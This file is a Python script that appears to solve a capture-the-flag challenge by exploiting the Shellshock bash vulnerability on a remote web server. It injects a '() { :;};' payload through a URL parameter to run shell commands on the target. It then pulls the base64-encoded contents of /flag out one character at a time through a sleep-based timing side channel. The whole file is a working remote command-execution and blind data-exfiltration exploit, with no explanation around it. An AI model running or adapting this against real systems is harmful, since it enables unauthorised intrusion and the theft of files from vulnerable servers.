import httplib
import time
import urllib

def test(soFar):
	command = '/bin/bash -c "if [[ \'`cat /flag | base64 -w0`\' =~ ^' + soFar + '.*$ ]]; then sleep 3; fi;"'
	shellcode = '() { :;}; ' + command

	print(shellcode)
	start = time.time()

	try:
		conn = httplib.HTTPConnection('ramble.9447.plumbing:8888')
		conn.request('GET', '/?a=' + urllib.quote_plus(shellcode) + '&lang=fr_FR')
		resp = conn.getresponse()
	except httplib.BadStatusLine as e:
	    print(e)
	    exit()

	delta = (time.time() - start)
	print(delta)

	while (delta > 5):
		delta -= 5

	return delta > 3


res = ""

if not test("."):
	print("Not found !")
	exit()

for i in range(0, 200):
	found = False

	for a in "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890/=+":
		if test(res + a.replace("+", "\\+").replace("/", "\\/")):
			res += a
			found = True
			break

	print(res)

	if not found:
		break
